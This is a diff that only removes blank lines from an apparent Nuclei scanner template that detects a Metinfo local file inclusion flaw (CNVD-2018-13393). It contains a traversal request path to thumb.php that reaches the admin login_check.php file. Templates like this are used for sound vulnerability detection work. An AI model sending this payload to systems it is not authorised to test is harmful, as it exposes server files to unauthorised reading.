@@ -1,5 +1,4 @@
 id: CNVD-2018-13393
-
 info:
   name: Metinfo LFI
   author: ritikchaddha
@@ -7,12 +6,10 @@ info:
   reference:
     - https://paper.seebug.org/676/
   tags: metinfo,cnvd,cvnd2018,lfi
-
 requests:
   - method: GET
     path:
       - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
-
     redirects: true
     max-redirects: 2
     matchers-condition: and
